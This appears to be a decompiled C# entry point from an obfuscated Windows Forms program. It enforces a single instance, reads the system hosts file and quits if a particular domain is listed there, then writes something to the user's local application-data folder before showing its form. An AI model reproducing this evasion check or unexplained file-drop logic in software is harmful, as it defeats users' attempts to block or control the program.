using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using ns1;
using ns2;

namespace ns0;

internal static class Class0
{
	public static Mutex mutex_0 = new Mutex(initiallyOwned: true, "{2C6D0AC4-B9A1-45fc-A8CF-35F04X6FDD4H}");

	[STAThread]
	private static void Main()
	{
		if (mutex_0.WaitOne(TimeSpan.Zero, exitContext: true))
		{
			smethod_0();
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Class3.string_2;
			Class3.smethod_3();
			Class3.smethod_2(Class3.string_1, path);
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Form1 form = new Form1();
			Application.Run((Form)(object)form);
			mutex_0.ReleaseMutex();
		}
		else
		{
			Environment.Exit(1);
		}
	}

	public static void smethod_0()
	{
		string text = File.ReadAllText(Environment.GetEnvironmentVariable("windir") + "\\system32\\drivers\\etc\\hosts");
		if (text.Contains("nurullahuzmez.com"))
		{
			Environment.Exit(1);
		}
	}
}
